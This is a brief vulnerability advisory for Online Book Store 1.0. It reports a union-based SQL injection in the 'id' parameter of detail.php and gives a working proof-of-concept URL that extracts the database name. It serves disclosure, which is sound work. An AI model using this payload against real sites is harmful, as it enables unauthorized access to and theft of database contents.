# Vulnerability title: Online Book Store 1.0 - 'id' SQL Injection  
# Vendor Homepage: https://www.sourcecodester.com/php/14383/online-book-store.html  
# Software Link: https://www.sourcecodester.com/download-code?nid=14383&title=Online+Book+Store  
# Version: 1.0  
# Tested On：Windows 10  
# Vulnerability description：  
This parameter "id" is vulnerable to Union-Based blind SQL injection in this path "/online%20book%20store/detail.php?id=1" that leads to retrieve all databases.
# Vulnerability recurrence：
1. http://path/Online%20Book%20Store/detail.php?id=-1%20%20union%20select%201,2,3,4,database(),6,7,8,9,10,11
![image](https://github.com/TCSWT/Online-Book-Store/blob/main/001.png)   
2.SQL command  
![image](https://github.com/TCSWT/Online-Book-Store/blob/main/002.png)  
# Vulnerability file:detail.php
![image](https://github.com/TCSWT/Online-Book-Store/blob/main/003.png) 
